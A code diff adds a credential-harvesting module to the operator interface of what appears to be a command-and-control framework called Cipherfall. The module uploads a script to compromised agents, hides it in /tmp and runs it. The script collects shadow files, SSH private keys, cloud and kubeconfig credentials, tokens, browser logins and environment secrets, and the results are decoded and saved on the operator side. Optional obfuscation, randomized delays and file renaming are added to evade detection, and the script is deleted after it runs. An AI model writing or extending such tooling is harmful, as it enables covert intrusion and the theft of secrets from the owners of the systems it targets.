@@ -965,6 +965,31 @@ _MODULE_DOCS: "dict[str, tuple[str, str]]" = {
   Output: full netdiscover report (can be lengthy; ~seconds to minutes).
   Example: /module netdiscover -n 10.0.0.0/24 --obfuscate""",
     ),
+    "harvest": (
+        "collect credentials from agent (shadow/ssh/history/cloud/browser)",
+        """/module harvest [--obfuscate] [--delayer INT JITTER] [--renamer]
+
+  Run harvest.sh on the selected agent.  Collects:
+    /etc/shadow, /etc/passwd, /etc/gshadow       (root recommended)
+    SSH private keys across /root and /home
+    Shell history lines matching credential patterns
+    AWS (~/.aws/credentials), GCP (ADC JSON), kubeconfig
+    ~/.pgpass, ~/.my.cnf, ~/.netrc, ~/.git-credentials
+    ~/.docker/config.json, ~/.npmrc, ~/.pypirc
+    GitHub CLI token, HashiCorp Vault token
+    /proc/*/environ env vars matching credential patterns
+    /etc/fstab embedded credentials (NFS/SMB/CIFS)
+    Firefox logins.json (encrypted blobs), Chrome Login Data paths
+
+  --obfuscate          pass script through shadowscript.sh first
+  --delayer INT JITTER inject random sleep delays between lines
+  --renamer            rename script file to a plausible name
+
+  Application order: delayer → obfuscate → renamer
+  Script sent inline as base64; removed from /tmp after exec.
+  Output decoded (gzip+base64) and saved to harvests/<agent>_<ts>.txt.
+  Root recommended for shadow/gshadow and /proc/*/environ coverage.""",
+    ),
     "relay": (
         "open TCP tunnel from agent back to C2",
         """/module relay [start [port]]
@@ -1088,6 +1113,11 @@ _COMPLETIONS: list[str] = [
     "/module netdiscover -n ",
     "/module netdiscover -i ",
     "/module netdiscover --obfuscate",
+    "/module harvest",
+    "/module harvest --obfuscate",
+    "/module harvest --delayer ",
+    "/module harvest --renamer",
+    "/module harvest --obfuscate --renamer",
     "/module relay",
     "/module relay start",
     "/module relay start ",
@@ -1111,6 +1141,7 @@ _COMPLETIONS: list[str] = [
     "/module help privesc",
     "/module help recon",
     "/module help netdiscover",
+    "/module help harvest",
     "/module help relay",
     "/module help upload",
     "/module help download",
@@ -1143,6 +1174,7 @@ class CipherfallTUI(App):
     _download_sessions: dict[str, dict] = {}  # session_id -> state
     _recon_tasks:       dict[str, dict] = {}  # task_id -> {type, agent_id, remote_path}
     _netdiscover_tasks: dict[str, dict] = {}  # task_id -> {type, agent_id, remote_path, args}
+    _harvest_tasks:     dict[str, dict] = {}  # task_id -> {type, agent_id, remote_path}
     _suicide_tasks:     dict[str, str]  = {}  # task_id -> agent_id
     _privesc_tasks:     dict[str, dict] = {}  # task_id -> {exploit, agent_id, tag}
     _root_spawned:      set[str]        = set()  # task_ids that already triggered _spawn_root_agent
@@ -1619,6 +1651,58 @@ class CipherfallTUI(App):
                 log.write("[dim]running netdiscover…[/dim]")
             return
 
+        hv = self._harvest_tasks.get(task_id)
+        if hv and hv["type"] == "harvest_write":
+            out = task.get("output") or ""
+            if "written" in out:
+                rp       = hv["remote_path"]
+                aid      = hv["agent_id"]
+                base_url = self._agent_base.get(aid, BASE)
+                exec_cmd = f"bash {rp}; rm -f {rp}"
+                log.write("[yellow]upload done — launching harvest…[/yellow]")
+                try:
+                    async with httpx.AsyncClient() as c:
+                        r2 = await c.post(f"{base_url}/admin/task",
+                                          json={"agent_id": aid, "command": exec_cmd},
+                                          timeout=3)
+                        res = r2.json()
+                    self._harvest_tasks[res["task_id"]] = {"type": "harvest_exec", "agent_id": aid, "remote_path": rp}
+                    self._selected_task = res["task_id"]
+                    await self._load_tasks(aid)
+                except Exception as e:
+                    log.write(f"[red]exec dispatch error: {e}[/red]")
+            elif out:
+                log.write(f"[red]upload error: {out[:200]}[/red]")
+            else:
+                log.write("[dim]uploading script…[/dim]")
+            return
+        if hv and hv["type"] == "harvest_exec":
+            out = task.get("output") or ""
+            if out:
+                try:
+                    clean = out.strip().replace("\n", "").replace("\r", "")
+                    clean += "=" * (-len(clean) % 4)
+                    raw  = base64.b64decode(clean)
+                    text = gzip.decompress(raw).decode("utf-8", errors="replace")
+                    ts   = time.strftime("%Y%m%d_%H%M%S")
+                    aid  = hv["agent_id"]
+                    out_dir = HERE / "harvests"
+                    out_dir.mkdir(exist_ok=True)
+                    out_path = out_dir / f"{aid[:8]}_{ts}.txt"
+                    out_path.write_text(text, encoding="utf-8")
+                    sections = [l for l in text.splitlines() if l.startswith("══")]
+                    log.write(f"[bold green]harvest complete — {len(sections)} sections, {len(text)} chars[/bold green]")
+                    log.write(f"[green]saved → {out_path}[/green]")
+                    for s in sections:
+                        log.write(f"  [cyan]{s}[/cyan]")
+                except Exception as e:
+                    log.write(f"[red]decode error: {e}[/red]")
+                    log.write("[dim]raw output (first 400 chars):[/dim]")
+                    log.write_raw(out[:400])
+            else:
+                log.write("[dim]running harvest…[/dim]")
+            return
+
         si = self._suicide_tasks.get(task_id)
         if si is not None:
             out = task.get("output") or ""
@@ -1938,6 +2022,8 @@ class CipherfallTUI(App):
         _netdiscover_remote = ""
         _netdiscover_aid    = ""
         _netdiscover_args   = ""
+        _harvest_remote  = ""
+        _harvest_aid     = ""
         if cmd.startswith("/module upload"):
             parts = cmd.split(None, 3)
             if len(parts) < 3:
@@ -2122,6 +2208,69 @@ class CipherfallTUI(App):
                 _netdiscover_remote = rname
                 _netdiscover_aid    = self._selected_agent
                 _netdiscover_args   = " ".join(nd_args)
+            finally:
+                shutil.rmtree(tmpdir, ignore_errors=True)
+        elif cmd.startswith("/module harvest"):
+            parts        = cmd.split()
+            do_obfuscate = "--obfuscate" in parts
+            do_renamer   = "--renamer"   in parts
+            delayer_fixed, delayer_jitter = "0.5", "0.2"
+            do_delayer = "--delayer" in parts
+            if do_delayer:
+                di = parts.index("--delayer")
+                try:
+                    delayer_fixed  = parts[di + 1]
+                    delayer_jitter = parts[di + 2]
+                except IndexError:
+                    log.clear()
+                    log.write("[red]usage: /module harvest [--obfuscate] [--delayer INT JITTER] [--renamer][/red]")
+                    return
+            hv_src   = HERE / "harvest.sh" if (HERE / "harvest.sh").exists() else HERE.parent / "Recon" / "harvest.sh"
+            ss_path  = HERE.parent / "Obfuscator"     / "shadowscript.sh"
+            del_path = HERE.parent / "Anti-forensics" / "echoerase_delayer.sh"
+            ren_path = HERE.parent / "Anti-forensics" / "echoerase_renamer.py"
+            if not hv_src.exists():
+                log.clear()
+                log.write(f"[red]not found: {hv_src}[/red]")
+                return
+            tmpdir = pathlib.Path(tempfile.mkdtemp())
+            try:
+                tmp = tmpdir / "harvest.sh"
+                shutil.copy(hv_src, tmp)
+                if do_delayer:
+                    log.write(f"[yellow]applying echoerase_delayer ({delayer_fixed}s ±{delayer_jitter}s)…[/yellow]")
+                    r = subprocess.run(
+                        ["bash", str(del_path), str(tmp), delayer_fixed, delayer_jitter],
+                        capture_output=True, text=True
+                    )
+                    delayed = tmpdir / "harvest_delayed.sh"
+                    delayed.write_text(r.stdout)
+                    tmp = delayed
+                if do_obfuscate:
+                    log.write("[yellow]applying shadowscript…[/yellow]")
+                    subprocess.run(["bash", str(ss_path), str(tmp)], capture_output=True, cwd=str(tmpdir))
+                    obf = tmp.with_name(tmp.stem + "_obfv2.sh")
+                    if not obf.exists():
+                        log.write("[red]shadowscript failed — sending unobfuscated[/red]")
+                    else:
+                        tmp = obf
+                if do_renamer:
+                    log.write("[yellow]applying echoerase_renamer…[/yellow]")
+                    r = subprocess.run(
+                        ["python3", str(ren_path), "--no-recover", "--ext", "--hide", str(tmp)],
+                        capture_output=True, text=True
+                    )
+                    if "→" in r.stdout:
+                        new_name = r.stdout.strip().split("→")[-1].strip()
+                        tmp = tmpdir / new_name
+                data  = tmp.read_bytes()
+                b64   = base64.b64encode(data).decode()
+                rname = f"/tmp/{tmp.name}" if do_renamer else f"/tmp/.{uuid.uuid4().hex[:8]}"
+                cmd   = f"WRITE:{rname}:{b64}"
+                flags = (["delayer"] if do_delayer else []) + (["obfuscate"] if do_obfuscate else []) + (["renamer"] if do_renamer else [])
+                log.write(f"[green]harvest ready ({'|'.join(flags) or 'raw'}) → {len(data)} bytes — uploading…[/green]")
+                _harvest_remote = rname
+                _harvest_aid    = self._selected_agent
             finally:
                 shutil.rmtree(tmpdir, ignore_errors=True)
         elif cmd.startswith("/module relay"):
@@ -2334,6 +2483,12 @@ class CipherfallTUI(App):
                 "agent_id":    _netdiscover_aid,
                 "remote_path": _netdiscover_remote,
                 "args":        _netdiscover_args,
+            }
+        if _harvest_remote:
+            self._harvest_tasks[result["task_id"]] = {
+                "type":        "harvest_write",
+                "agent_id":    _harvest_aid,
+                "remote_path": _harvest_remote,
             }
         if _download_local:
             tid = result["task_id"]
